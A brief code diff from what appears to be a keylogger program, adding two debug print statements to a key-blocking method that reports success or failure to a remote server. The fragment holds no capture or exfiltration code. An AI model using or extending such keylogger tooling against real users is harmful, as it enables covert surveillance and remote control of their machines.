@@ -47,8 +47,10 @@ class KeyLogger:
         ok = self.hooker.block()
 
         if ok:
+            print('s')
             self.server.send_obj("Success")
         else:
+            print('f')
             self.server.send_obj("Failed")
 
     def unblock_keys(self):
